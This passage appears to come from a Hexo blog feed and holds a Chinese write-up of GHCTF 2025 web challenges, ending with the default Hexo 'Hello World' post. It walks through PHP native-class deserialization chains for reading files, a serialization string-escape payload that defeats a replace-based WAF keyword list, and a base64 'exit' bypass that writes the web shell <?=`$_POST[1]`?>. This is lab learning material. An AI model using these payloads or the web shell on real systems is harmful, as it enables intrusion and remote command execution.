</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要考察的php的原生类的反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 很像下面的：</span></span><br><span class="line"><span class="variable">$day3</span> = <span class="keyword">new</span> <span class="title class_">DircetoryIterator</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$day4</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子构造在上面源码里面。</p><p>接着说一下<code>md5(md5($this-&gt;fruit11)) == 666</code>，如何构造<code>fruit11</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dict</span> <span class="keyword">as</span> <span class="variable">$a1</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dict</span> <span class="keyword">as</span> <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="variable">$temporary</span> = <span class="variable">$a1</span>.<span class="variable">$a2</span>; <span class="comment">// 这里也可以是3个字符，或者更多，只要爆破出来为两次md5变为等于666就可以。</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$temporary</span>)) == <span class="number">666</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$temporary</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250701193610527.png" class="" title="image-20250701193610527"><p>接着说一下array_walk函数:</p><img src="/CTFwp/GHCTF-2025/image-20250701194330890.png" class="" title="image-20250701194330890"><p>callback回调函数，将object中属性的键作为第二个参数，值作为第一个参数。</p><p><code>array_walk($this, function ($day1, $day2)</code>：</p><p>$this 表示 array_walk所在类的本身，如果我们要利用漏洞的话，就要添加一个属性:<code>public $DirectoryIterator=&#39;/&#39;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$DirectoryIterator</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;eS&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$My</span>= <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="variable">$Ph</span> = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$Ph</span> -&gt; fruit10 = <span class="variable">$My</span>;</span><br><span class="line"><span class="variable">$CB</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB</span> -&gt; fruit2 = <span class="variable">$Ph</span>;</span><br><span class="line"><span class="variable">$CB1</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB1</span> -&gt; fruit1 = <span class="variable">$CB</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$CB1</span>);</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250701195759020.png" class="" title="image-20250701195759020"><p>通过DirectoryIterator类得到&#x2F;目录的文件名，再通过SplFileObject类查看内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$SplFileObject</span> = <span class="string">&#x27;/flag44545615441084&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;eS&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$My</span>= <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="variable">$Ph</span> = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$Ph</span> -&gt; fruit10 = <span class="variable">$My</span>;</span><br><span class="line"><span class="variable">$CB</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB</span> -&gt; fruit2 = <span class="variable">$Ph</span>;</span><br><span class="line"><span class="variable">$CB1</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$CB1</span> -&gt; fruit1 = <span class="variable">$CB</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$CB1</span>);</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250701195729122.png" class="" title="image-20250701195729122"><h2 id="Escape！"><a href="#Escape！" class="headerlink" title="Escape！"></a>Escape！</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小李写了个登陆网站，他不放心便加了个waf,殊不知这个waf不仅没让网站更安全反而给了黑客机会</span><br></pre></td></tr></table></figure><p>这个是题目描述，还有附件，下载一下附件。</p><p>waf.php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>); <span class="comment">// 这里会将上面的内容替换为error</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250702170021384.png" class="" title="image-20250702170021384"><p>表单的数据会进入login.php文件，我们接着看login.php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;db.php&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$SQL</span>=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$db</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,[<span class="variable">$username</span>]); <span class="comment">// 查询语句</span></span><br><span class="line"><span class="comment">// 由于使用的占位符，所以这里没有sql注入漏洞。</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;用户不存在&#x27;)&lt;/script&gt;&lt;script&gt;window.location.href = &#x27;index.html&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="comment">// 判断data是否存在</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="number">0</span>][<span class="string">&#x27;password&#x27;</span>]!==<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;密码错误&#x27;)&lt;/script&gt;&lt;script&gt;window.location.href = &#x27;index.html&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$user</span>; <span class="comment">// 这里返回了一个User类的实例化对象。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setSignedCookie</span>(<span class="params"><span class="variable">$serializedData</span>, <span class="variable">$cookieName</span> = <span class="string">&#x27;user_token&#x27;</span>, <span class="variable">$secretKey</span> = <span class="string">&#x27;fake_secretKey&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$signature</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$serializedData</span>, <span class="variable">$secretKey</span>); <span class="comment">// 生成签名</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serializedData</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$signature</span>); <span class="comment">// 对签名和序列化数据进行签名</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="variable">$cookieName</span>, <span class="variable">$token</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 设置有效期为1小时</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$User</span>=<span class="title function_ invoke__">login</span>(<span class="variable">$SQL</span>,<span class="variable">$username</span>,<span class="variable">$password</span>); <span class="comment">// 调用上面的login函数，返回User类的实例化对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$User_ser</span>=<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$User</span>)); <span class="comment">// 这里可能会对序列化数据进行更改</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setSignedCookie</span>(<span class="variable">$User_ser</span>); <span class="comment">// 在这一步以及后序列化数据不会发生改变</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dashboard.php&quot;</span>); <span class="comment">// 重定向到dashboard.php</span></span><br></pre></td></tr></table></figure><p>dashboard.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSignedCookie</span>(<span class="params"><span class="variable">$cookieName</span> = <span class="string">&#x27;user_token&#x27;</span>, <span class="variable">$secretKey</span> = <span class="string">&#x27;fake_secretkey&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 Cookie 内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$cookieName</span>])) &#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="variable">$cookieName</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解码并分割数据和签名</span></span><br><span class="line">        <span class="variable">$decodedToken</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$serializedData</span>, <span class="variable">$providedSignature</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$decodedToken</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新计算签名</span></span><br><span class="line">        <span class="variable">$calculatedSignature</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$serializedData</span>, <span class="variable">$secretKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较签名是否一致</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$calculatedSignature</span> === <span class="variable">$providedSignature</span>) &#123;</span><br><span class="line">            <span class="comment">// 签名验证通过，返回序列化的数据</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$serializedData</span>;  <span class="comment">// 反序列化数据</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 签名验证失败</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 如果没有 Cookie</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：验证并读取 Cookie</span></span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">checkSignedCookie</span>(); <span class="comment">// 序列化数据后面就没有变过，所以签名验证这一步肯定是可以过的。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userData</span>) &#123;</span><br><span class="line">    <span class="comment">#echo $userData;</span></span><br><span class="line">    <span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="comment">#var_dump($user);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;isadmin)&#123; <span class="comment">// 如果我们要写入文件的话，isadmin必须为true</span></span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]||<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token验证失败&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先在login.php页面注册一个用户，然后登录进去，拿到setcookie。</p><img src="/CTFwp/GHCTF-2025/image-20250702171432898.png" class="" title="image-20250702171432898"><p>我们现在需要isadmin为1。</p><p>前面waf那里就可以进行字符的增加和减少，感觉可以进行字符串逃逸。</p><p><code>&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>为21个字符，我选择的是<code>||</code>，<code>||</code>到error，相差3个字符，27除以3，为7，所以要输入7次||，再拼接”;s:7:”isadmin”;b:1;}就可以。</p><img src="/CTFwp/GHCTF-2025/image-20250702171918436.png" class="" title="image-20250702171918436"><p>在注册表的用户名输入我们构造好的payload:<code>||||||||||||||&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>，密码随便输，注册完后，接着登录就可以进入下图所在的页面。</p><img src="/CTFwp/GHCTF-2025/image-20250702172030850.png" class="" title="image-20250702172030850"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是死亡绕过了。<br>我们输入的内容为:base64加密的内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64解码：4字节变为3字节，<code>&lt;?php exit; ?&gt;</code>，有效字符只有phpexit七个字符，只有8个字符才能有效解码，所以这里我们再随机添加一个字符，就可以成功解码。</p><img src="/CTFwp/GHCTF-2025/image-20250702172952107.png" class="" title="image-20250702172952107"><p>a 是我随便加的。</p><img src="/CTFwp/GHCTF-2025/image-20250702173132577.png" class="" title="image-20250702173132577"><p>最后拿flag。</p><img src="/CTFwp/GHCTF-2025/image-20250702173145120.png" class="" title="image-20250702173145120">]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hexo-method/hello-world/"/>
      <url>/hexo-method/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a 